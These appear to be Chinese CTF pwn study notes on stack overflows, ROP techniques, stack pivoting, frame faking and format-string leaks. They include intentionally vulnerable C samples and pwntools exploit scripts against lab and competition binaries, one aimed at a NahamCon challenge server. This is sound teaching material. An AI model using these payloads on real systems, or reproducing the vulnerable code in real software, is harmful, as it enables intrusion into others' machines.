> 找到 archive.ubuntu.com 的方法：
> https://pkgs.org/download/libc-bin 找libc
> https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libc-bin_2.27-3ubuntu1_amd64.deb.html Binary Package那有deb下载链接，链接删去最后的文件名，就是 archive.ubuntu 的 FTP
>
> md5sum file 查看文件md5 hash





## Stack Buffer Overflow

> 栈溢出 栈缓冲区溢出（stack buffer overflow, stack buffer overrun）
>
> 函数调用栈基础知识参考链接：
>
> https://www.cnblogs.com/clover-toeic/p/3755401.html C语言函数调用栈(一)
>
> https://www.cnblogs.com/clover-toeic/p/3756668.html C语言函数调用栈(二)  包含x86函数返回值传递方法，暂未收录

- 栈帧是运行时概念，若程序不运行，就不存在栈和栈帧
- 但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用

Stack Overflow Workflow:

1. 寻找危险函数。快速确定程序是否可能有栈溢出，栈溢出位置在哪。常见危险函数
   - input: `gets`, `scanf`, `vscanf`
   - output: `sprintf`
   - string:` strcpy`, `strcat`, `bcopy`
2. 确定填充长度。计算能够操作的地址与预期覆盖的地址之间的距离。通常打开IDA，根据给定的地址计算偏移。
   - 变量索引模式：
     - 相对于栈基址的索引: 通过查看EBP相对偏移获得
     - 相对于栈顶指针的索引: 一般需要调试，之后转换为相对于栈基址的索引
     - 直接地址索引: 相当于直接给定地址
   - 覆盖需求：(目的一般为 直接或间接控制程序执行流程)
     - 覆盖函数返回地址：直接看EBP
     - 覆盖栈上某个变量的内容：需精细计算
     - 覆盖bss段某个变量内容
     - 根据现实执行情况，覆盖特定的变量或地址的内容





- x86: **函数参数**在**函数返回地址**的上方
- x64:
  - System V AMD64 ABI (Linux、FreeBSD、macOS...) 中前6个整型/指针参数保存在 **RDI, RSI, RDX, RCX, R8, R9 寄存器**，如果还有更多的参数的话才会保存在栈上
  - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常






- 整数寄存器图表：

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/interger_registers.png)







### Stack Overflow Theory

> 栈溢出原理
>
> https://www.cnblogs.com/rec0rd/p/7646857.html  关于Linux下ASLR与PIE的一些理解
>
> https://www.anquanke.com/post/id/85831 现代栈溢出利用技术基础：ROP

- 程序向栈中某个变量中写入的字节数超过变量本身所申请的字节数，导致与其相邻的栈中的变量的值被改变。类似的还有堆溢出，bss 段溢出等溢出方式

发生栈溢出的基本前提：

1. 程序向栈上写入数据
2. 写入数据的大小没有被良好控制

```bash
gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
-m32 生成32bit程序
-fno-stack-protector 不开启堆栈溢出保护，即不生成 canary
-no-pie 不开启PIE(Position Independent Executable)，避免加载基址被打乱
```

```c
// 简单示例 stack_example.c // gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
// 这一例子属于 ret2text
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

```bash
$ checksec example
[*] '/home/kali/CTF/pwn/example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- IDA中vulnerable函数的栈显示如下：

```assembly
-00000014 s               db 16 dup(?)            ; string(C)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

```python
# coding=utf8   # 这个脚本执行后效果：可以看到 You Hava already controlled it. 字样，是success函数的输出
from pwn import *
# 构造与程序交互的对象
sh = process('./example')
success_addr = 0x08049172 # 这个是在IDA中分析得到的success函数的地址
# 0x14字节对应字符串s和var_4 # 4个b对应保存的寄存器s # 然后紧跟的就是success函数地址 用于覆盖原本的函数返回地址
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr) # 构造payload 
sh.sendline(payload) # 向程序发送字符串
sh.interactive() # 将代码交互转换为手工交互
```





---

## ROP and Stack Overflow

> ROP(Return Oriented Programming)   面向返回编程    栈溢出问题
>
> 核心在于利用指令集中的 `ret` 指令，改变了指令流的执行顺序
>
> 参考链接：
>
> https://www.anquanke.com/post/id/85831   【技术分享】现代栈溢出利用技术基础：ROP   
>
> https://zhuanlan.zhihu.com/p/25816426
>
> https://zhuanlan.zhihu.com/p/25892385
>
> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html
>
> https://xz.aliyun.com/t/3402

- 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)
- 在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程**
- **gadgets**: 以 `ret` 结尾的指令序列，通过这些指令序列，可修改某些地址的内容，以控制程序的执行流程

所需条件：

1. 程序存在溢出，且可以控制返回地址
2. 可以找到满足条件的gadgets以及相应gadgets的地址(若 gadgets 地址不固定，就需要想办法动态获取对应的地址)



Important Cases:

- ROP_bamboofox_ret2syscall: 案例小巧简单，但是payload需要精心构造，多次rop，适合学习rop构造方法，rsp变化过程
- 



### ret2text

> return to .text of the executable program
>
> 栈溢出原理中所举例子属于该类别

- 控制程序执行程序本身的代码段(.text)
- 也可以控制程序执行好几段不相邻的已有代码(gadgets)
- 需要知道对应的返回的代码的位置

> 案例demo_ROP_bamboofox_ret2text见  https://github.com/kokifish/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2text , 所使用的脚本：
>
> ```python
> # python3 pwntools # demo_ROP_ret2text
> from pwn import *
> sh = process('./ret2text')
> target = 0x804863a # 这个是 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> payload = b'A' * (0x6c + 4) + p32(target) # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```
>
> 该案例总结：
>
> 1. IDA分析出危险函数(`gets`)
> 2. IDA分析出可以用于getshell的地方(`system("/bin/sh");`)，记录可以 getshell 的地址
> 3. gdb(pwndbg)分析出`gets`函数所用字符串 s 与 return address 之间的偏移量，构造payload，将用于getshell的地址覆盖到 return address
>
> 比赛案例：
>
> - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。
>
> ```python
> # NahamCon 2021 (ctf.nahamcon.com): Ret2basic # 
> # 0x0000000000401334   call    _gets
> from pwn import *
> context.log_level = 'debug'
> sh = remote('challenge.nahamcon.com', 30413)
> # 这个是前面分析的 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> target = 0x0000000000401215
> payload = b'A' * (0x70 + 8) + p64(target)  # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```



### ret2shellcode

- 控制程序执行shellcode代码（例如sh）
- shellcode: 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell
- 通常，ret2shellcode问题中，shellcode 需要自行填充。这是另外一种典型的利用方法，即此时需要自己填充一些可执行的代码。(ret2text则是利用程序自身的代码)
- 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限



> 案例见demo_ROP_bamboofox_ret2shellcode  https://github.com/kokifish/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2shellcode 有一些问题，见writeup



### ret2syscall

- 控制程序执行系统调用(system call)，获取 shell
- Linux 系统调用号：`/usr/include/asm/unistd.h`

> # 系统调用(wikipedia)
>
> 系统调用 system call，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信
>
> 操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间
>
> 库函数：系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。

- Linux 系统调用通过 `int 80h` 实现，用系统调用号区分入口函数。操作系统实现系统调用的基本过程：

1. 应用程序调用库函数 API
2. API **将系统调用号存入 EAX**，然后通过中断调用`int 0x80`使系统进入内核态
3. 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）
4. 系统调用完成相应功能，将**返回值存入 EAX**，返回到中断处理函数
5. 中断处理函数返回到 API 中
6. API 将 EAX 返回给应用程序

- 应用程序调用系统调用的过程是：
1. 把系统调用的编号存入 **EAX**
2. 把**函数参数存入其它通用寄存器**
3. 触发 0x80 号中断`int 0x80`

> 案例见 demo_ROP_bamboofox_ret2syscall (https://github.com/kokifish/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2syscall)



### ret2libc

> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html 
>
> https://xz.aliyun.com/t/3402

- 控制函数的执行 libc 中的函数。通常是返回至某个函数的 **PLT** 处或者函数的具体位置 (即函数对应的 **GOT** 表项的内容)
- 一般情况下，会选择执行 `system("/bin/sh")`，故需要知道 system 函数的地址
- r2libc技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的no stack executable限制(所以后续实验还是需要关闭系统的ASLR，以及堆栈保护)，比如PaX和ExecShield安全策略。该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到libc库中的某个库函数(e.g. system)，而不是直接定位到shellcode。通过在栈中精心构造该库函数的参数，达到类似于执行shellcode的目的

```bash
readelf -S ret2libc # 可以获得段地址，比如bbs段的地址 # 也可在IDA中获得bbs段的地址
```



### ret2csu



> # Cases
>
> - ciscn_2019_s_3: 全国大学生信息安全竞赛 线下半决赛。https://blog.csdn.net/github_36788573/article/details/103541178







### Blind ROP (BROP)

> BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是Hacking Blind

- BROP是**没有对应应用程序的源代码或者二进制文件**下，对程序进行攻击，劫持程序的执行流

**攻击条件**

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。

**基本思路**：在BROP中，基本的遵循的思路如下

- 判断栈溢出长度
  - 暴力枚举: 直接从1暴力枚举即可，直到发现程序崩溃
- Stack Reading
  - 获取栈上的数据来泄露canaries，以及ebp和返回地址。
- Blind ROP
  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。
- Build the exploit
  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。





### ret2dlresolve

> https://blog.csdn.net/qq_51868336/article/details/114644569 这个很长，很多案例，但缺少原始binary，payload解释不全，且和自己的binary对应不上。好多博客讲的感觉都不太好... 缺少必要的前置知识，建议重新梳理
>
> https://bbs.pediy.com/thread-227034.htm
>
> 动态链接的过程以及使用到的section记录到executable中

Linux程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数重定位，控制`_dl_runtime_resolve`即可控制解析的函数，使其解析出想要的函数。

`_dl_runtime_resolve`解析符号地址时使用的都是从目标文件中的动态节`.dynamic`索引得到的

1. 重定位表项`.rel(a).dyn & .rel(a).plt`: 只读

   ```assembly
   ; ELF JMPREL Relocation Table; .rel(a).plt 需要重定位的函数的信息
   Elf64_Rela <600B78h, 100000007h, 0> ; R_X86_64_JUMP_SLOT read ; 1at arg: read@.got.plt
   Elf64_Rela <600B80h, 200000007h, 0> ; R_X86_64_JUMP_SLOT __libc_start_main
   Elf64_Rela <600B88h, 400000007h, 0> ; R_X86_64_JUMP_SLOT setvbuf
   Elf64_Rela <600B90h, 500000007h, 0> ; R_X86_64_JUMP_SLOT atoi
   LOAD            ends
   ```

2. 动态符号表`.dynsym`: 只读，`DT_SYMTAB, ELF Symbol Table`

   ```assembly
   ; ELF Symbol Table
   Elf64_Sym <0> ; 一个Elf64_Sym占0x18B <offset in dynstr, ...>
   Elf64_Sym <offset aRead - offset p_dynstr, 12h, 0, 0, 0, 0> ; "read"
   Elf64_Sym <offset aLibcStartMain - offset p_dynstr, 12h, 0, 0, 0, 0> ; "__libc_start_main"
   Elf64_Sym <offset aGmonStart - offset p_dynstr, 20h, 0, 0, 0, 0> ; "__gmon_start__"
   Elf64_Sym <offset aSetvbuf - offset p_dynstr, 12h, 0, 0, 0, 0> ; "setvbuf"
   Elf64_Sym <offset aAtoi - offset p_dynstr, 12h, 0, 0, 0, 0> ; "atoi"
   Elf64_Sym <offset aStdout - offset p_dynstr, 11h, 0, 1Ah, offset stdout, 8> ; "stdout"
   Elf64_Sym <offset aStdin - offset p_dynstr, 11h, 0, 1Ah, offset stdin, 8> ; "stdin"
   Elf64_Sym <offset aStderr - offset p_dynstr, 11h, 0, 1Ah, offset stderr, 8> ; "stderr"
   ```

3. 动态字符串表`.dynstr`: 只读，动态链接所需要的字符串，`DT_STRTAB, ELF String Table`. 

   ````assembly
   LOAD:0000000000400368 p_dynstr        db 0 ; 以0开头; ELF String Table
   LOAD:0000000000400369 aLibcSo6        db 'libc.so.6',0 
   LOAD:0000000000400373 aStdin          db 'stdin',0 
   LOAD:0000000000400379 aRead           db 'read',0
   LOAD:000000000040037E aStdout         db 'stdout',0 
   LOAD:0000000000400385 aStderr         db 'stderr',0
   LOAD:000000000040038C aAtoi           db 'atoi',0
   LOAD:0000000000400391 aSetvbuf        db 'setvbuf',0
   LOAD:0000000000400399 aLibcStartMain  db '__libc_start_main',0
   LOAD:00000000004003AB aGmonStart      db '__gmon_start__',0 
   LOAD:00000000004003BA aGlibc225       db 'GLIBC_2.2.5',0   ; ELF GNU Symbol Version Table
   ````



> # Case
>
> hitctf2021 pwn1 silent: 能向任意地址写8B，存在栈溢出。将`Elf64_Dyn <5, 400368h>; DT_STRTAB`字符串表中的地址`0x400368`改为bss区上一个可控的buf上，buf上伪造一个字符串表，替换某个函数(read)的函数名为`system`，再写上`/bin/sh`，然后利用栈溢出，`pop rdi;ret;addr_bin_sh;addr_read_plt`，就变成解析`system`符号并调用`system("/bin/sh")`

### Fancy Stack Overflow

> 花式栈溢出

#### Stack Pivoting

> 直译 栈旋转. 指劫持栈指针
>
> cases: 

劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。通常在以下情况需要使用Stack Pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链。比如可以劫持到bbs, heap。
- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域
- 其它漏洞难以利用，需要进行转换。比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

利用 stack pivoting 的要求：

1. 可以控制程序执行流。

2. 可以控制 **sp** 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

```assembly
pop rsp/esp
# 利用两次leave 在控制rbp后 间接控制rsp
leave ...; leave: mov rsp, rbp, pop rbp; # 第一条 leave 利用栈上内容，覆盖rbp
leave  ; 第二条 leave 把已经被劫持的rbp的值赋值给rsp
```

- `libc_csu_init` 中的 gadgets，通过偏移可以控制 rsp 指针，上面是正常的，下面是偏移的

```assembly
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

更加高级的 fake frame: 

可以控制的内存，一般有：

- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限
- heap。但是这个需要能泄露堆地址







#### Frame Faking

> 帧伪造 栈帧伪造
>
> Cases:
>
> - GKCTF2021 应急挑战杯 checkin login   对应writeup有详细的劫持过程的分析，分析了一部分重要指令前后rbp rsp的变换

构造一个虚假的栈帧来控制程序的执行流。概括地讲，在之前讲的栈溢出不外乎两种方式

- 控制程序 EIP
- 控制程序 EBP

其最终都是控制程序的执行流。 frame faking 利用的技巧是同时控制 EBP 与 EIP，在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下

```assembly
buffer padding | fake ebp | leave ret addr | ; 利用栈溢出将栈上构造为该格式
```

- 函数的返回地址被覆盖为执行 `leave ret` 的地址，这就表明了函数在正常执行完自己的 `leave ret` 后，还会再次执行一次 `leave ret`
- 其中 `fake ebp` 为构造的栈帧的基地址，需要注意的是这里是一个地址。是想要劫持过去的目的地址。一般构造的假栈帧如下

```assembly
fake ebp #  fake ebp 指向 ebp2, 即它为 ebp2 所在的地址
|
v
ebp2|target function addr|leave ret addr|arg1|arg2 # 右边为高地址
```

- 通常`fake ebp`表示的地址(ebp2)是能够控制的可读的内容

```assembly
; 函数序言      # 函数的入口点与出口点的基本操作
push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp
....
; 函数尾声
leave ; mov esp, ebp; pop ebp # 将ebp的值赋给esp, 弹出ebp
ret # pop eip，弹出栈顶元素作为程序下一个执行地址
```

- 基本控制过程：Case: GKCTF2021 应急挑战杯 checkin login 就是这个过程

1. 在有栈溢出的程序执行 leave 时，其分为两个步骤
   - mov esp, ebp ，将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
   - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。`$ebp = addr_of_rbp2`
2. 执行 ret 指令，会再次执行 leave ret 指令。pop eip,  `$eip = addr_leave_ret`
3. 执行 leave 指令，其分为两个步骤
   - mov esp, ebp; 使 esp 指向 ebp2。`$esp = addr_rbp2`
   - pop ebp; 将 ebp 的值设置为 ebp2 (因为`$esp = addr_rbp2`)，同时 esp 会指向 target function。`$ebp=ebp2, $esp=target_function_addr`, 因为pop后esp+4，所以就指向紧跟在ebp2后的`target_function_addr`
4. 执行 ret 后程序就会执行 target function(因为现在rsp指向了`target_function_addr`)，当其进行函数序言：
   - push ebp，会将 ebp2 值压入栈中，
   - mov ebp, esp，将 ebp 指向当前基地址。`$ebp=$esp=addr_rbp2`

```assembly
ebp    ; 此时的栈结构
|
v
ebp2|leave ret addr|arg1|arg2
```

1. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
2. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程

在 fake frame 中，必须得有一块可以写的内存，并且还知道这块内存的地址，这一点与 stack pivoting 相似







---

## Format String Vulnerability

> Format String Vulnerability 格式化字符串漏洞
>
> format string: 程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数
>
> 转换说明 conversion specification: 用于把随后对应的0个或多个函数参数转换为相应的格式输出

- 格式化字符串函数可以接受可变数量的参数，并将**第一个参数作为格式化字符串，根据其来解析之后的参数**。几乎所有的C/C++程序都会利用格式化字符串函数来**输出信息，调试程序，或者处理字符串**。通常在利用时分为三个部分：
  1. 格式化字符串函数
  2. 格式化字符串
  3. (optional)后续参数

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/pwn_printf_demo.png)

上面的这个`printf`调用时，栈上的布局从高地址到低地址为：

```python
# High Addr # printf("Color %s, Number %d, Float %4.2f", "red", 123456, 3.14); 调用时的栈
some value             # 某个未知的值
3.14                   # printf 第4个参数
123456                 # printf 第3个参数
addr of "red"          # 字符串 "red" 的地址 # printf 第2个参数
addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式化字符串，printf 第1个参数
# low Addr
```

进入`printf`后，首先获取第一个参数format string，一个一个读取字符，分析逻辑如下：

1. 当前字符不是%，直接输出到相应标准输出
2. 当前字符是%， 继续读取下一个字符：
   1. 如果没有字符，报错
   2. 如果下一个字符是%，输出%
   3. 否则根据相应的字符，获取相应的参数，对其进行解析并输出

那么，当程序为`printf("Color %s, Number %d, Float %4.2f");`，程序继续运行，将栈上格式化字符串上面的三个变量分别解析为：解析其地址对应的字符串，解析其内容对应的整形值，解析其内容对应的浮点值。



### 格式化字符串与相关函数

> https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2

- 格式化字符串基本格式:  `%[parameter][flags][field width][.precision][length]type`

- parameter
  - n\$，获取格式化字符串中的指定参数。n是用这个格式说明符(specifier)显示第几个参数；使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符也须使用parameter。这是POSIX扩展，不属于ISO C。e.g. `printf("%2$d %2$#x; %1$d %1$#x",16,17);// 17 0x11; 16 0x10` `2$`说明使用第2个参数，即17，`1$`说明使用第一个参数即16
- flags:
  - `+`: 总是表示有符号数值的'+'或'-'号，缺省情况是忽略正数的符号。仅适用于数值类型
  - `space`:  使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与'+'同时出现，则空格说明符被忽略
  - `-`: 左对齐。缺省情况是右对齐
  - `#`: 对于'`g`'与'`G`'，不删除尾部0以表示精度。对于'`f`', '`F`', '`e`', '`E`', '`g`', '`G`', 总是输出小数点。对于'`o`', '`x`', '`X`', 在非0数值前分别输出前缀`0`, `0x`, and `0X`表示数制
  - `0`: 如果*width*选项前缀以`0`，则在左侧用`0`填充直至达到宽度要求。e.g.`printf("%2d", 3);// 3`，`printf("%02d", 3)//03`。如果`0`与`-`均出现，则`0`被忽略，即左对齐依然用空格填充
- field width
  - 输出的最小宽度
- precision
  - 输出的最大长度
- length，输出的长度
  - hh，输出一个字节
  - h，输出一个双字节
- type
  - d/i，有符号整数
  - u，无符号整数
  - x/X，16进制unsigned int 。x使用小写字母；X使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。
  - o，8进制unsigned int 。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。
  - s，如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb 函数。
  - c，如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。
  - p， void *型，输出对应变量的值。`printf("%p",a)`用地址的格式打印变量a的值，`printf("%p", &a)`打印变量a所在的地址。
  - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  - %， '`%`'字面值，不接受任何flags, width。



- 常见格式化字符串**输入**函数：
  - scanf

- 常见格式化字符串**输出**函数

| Function                  | Description                            |
| ------------------------- | -------------------------------------- |
| printf                    | 输出到stdout                           |
| fprintf                   | 输出到指定FILE流                       |
| vprintf                   | 根据参数列表格式化输出到 stdout        |
| vfprintf                  | 根据参数列表格式化输出到指定FILE流     |
| sprintf                   | 输出到字符串                           |
| snprintf                  | 输出指定字节数到字符串                 |
| vsprintf                  | 根据参数列表格式化输出到字符串         |
| vsnprintf                 | 根据参数列表格式化输出指定字节到字符串 |
| setproctitle              | 设置argv                               |
| syslog                    | 输出日志                               |
| err, verr, warn, vwarn... | ...                                    |



### 格式化字符串漏洞利用

1. 使程序崩溃。 %s 对应的参数地址不合法的概率较大，输入若干个 %s ，栈上不可能每个值都对应了合法的地址，总是会有某个地址可以使得程序崩溃
2. 查看进程内容。根据 `%d, %f, %08x`等输出栈上的内容
   1. 泄露栈内存
      - 获取某个变量的值
      - 获取某个变量对应地址的内存
   2. 泄露任意地址内存
      - 利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址
      - 盲打，dump 整个程序，获取有用信息



#### 泄露内存

通常来说：

1. 利用 `%x` 来获取对应栈的内存，但建议使用 `%p`，可以不用考虑位数的区别
2. 利用 `%s` 来获取变量所对应地址的内容，只不过有零截断
3. 利用 `%order$x` 来获取指定参数的值，利用 `%order$s` 来获取指定参数对应地址的内容。order为一数字



```cpp
#include <stdio.h>  // leakmemory.c // gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
int main() {  // 编译时指定了为32bit 格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为参数
    char s[100];  // printf(s); 处: warning: format not a string literal and no format arguments [-Wformat-security]
    int a = 1, b = 0x22222222, c = -1;
    scanf("%s", s);                             // 在这里输入 %08x.%08x.%08x
    printf("%08x.%08x.%08x.%s\n", a, b, c, s);  // Output:  00000001.22222222.ffffffff.%08x.%08x.%08x
    printf(s);
    return 0;
}
```
- 输入为`%08x.%08x.%08x`时的栈，输出：
```assembly
$ gdb leakmemory
> b printf
> r # run
%08x.%08x.%08x      #   scanf("%s", s);   输入 %08x.%08x.%08x 后回车
Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28   # 在第1个 printf 处断下
─────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp  # 返回地址
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # 格式化字符串的地址    printf的第 1 个参数  # 0x8048563
0xffffccf4│+0x08: 0x00000001      # a = 1     格式化字符串的第 1 个参数  printf的第 2 个参数
0xffffccf8│+0x0c: 0x22222222      # b = 0x22222222  格式化字符串的第 2 个参数  printf的第 3 个参数
0xffffccfc│+0x10: 0xffffffff      # c = -1    格式化字符串的第 3 个参数  printf的第 4 个参数
0xffffcd00│+0x14: 0xffffcd10  →  "%08x.%08x.%08x" # 输入的字符串的地址 s="%08x.%08x.%08x" # 格式化字符串的第 4 个参数  printf的第 5 个参数 
0xffffcd04│+0x18: 0xffffcd10  →  "%08x.%08x.%08x" # 下一个 printf 函数的格式化字符串 即下一个printf的第 1 个参数
0xffffcd08│+0x1c: 0x000000c2
> c # continue
00000001.22222222.ffffffff.%08x.%08x.%08x  # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出  s="%08x.%08x.%08x"
Breakpoint 1, __printf (format=0xffffcd10 "%08x.%08x.%08x") at printf.c:28 # 在第2个 printf 处断下
─────────────────────────────────────────[ stack ]────  # printf(s); 的栈
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%08x.%08x.%08x" # 格式化字符串的地址 printf的第 1 个参数 0xffffcd10
0xffffcd04│+0x08: 0xffffcd10  →  "%08x.%08x.%08x" # 栈上的 0xffffcd04 及其后的数值分别作为第1,2,3个参数按int型解析，分别输出
0xffffcd08│+0x0c: 0x000000c2                 # 被解析的第2个int型
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 被解析的第3个int型
0xffffcd10│+0x14: "%08x.%08x.%08x"   ← $eax # "%08x.%08x.%08x" 的首地址
0xffffcd14│+0x18: ".%08x.%08x"
0xffffcd18│+0x1c: "x.%08x"
> c # continue # 输出以下内容后退出 [Inferior 1 (process 57077) exited normally]
ffffcd10.000000c2.f7e8b6bb  # 这里泄露的是栈上的内存
```

- 如果换成`%p.%p.%p`，则输入输出为：

```python
%p.%p.%p # 输入
00000001.22222222.ffffffff.%p.%p.%p # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
0xfff328c0.0xc2.0xf75c46bb # printf(s); 的输出
```

- 并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的
- 获取**栈中被视为第 n+1 个参数的值**：(格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，相对于输出函数来说，是第 n+1 个参数)

```c
printf("%3$x"); // 获取对于printf函数来说，视为第4个参数的值  //  %2$s 将栈上第3个参数作为字符串输出
```
- 输入为`%3$x`时的栈，输出：
```assembly
$ gdb leakmemory
>  b printf
>  r
%3$x # 输入
────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # format string
0xffffccf4│+0x08: 0x00000001
0xffffccf8│+0x0c: 0x22222222
0xffffccfc│+0x10: 0xffffffff
0xffffcd00│+0x14: 0xffffcd10  →  "%3$x"
0xffffcd04│+0x18: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x1c: 0x000000c2
>  r
00000001.22222222.ffffffff.%3$x # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
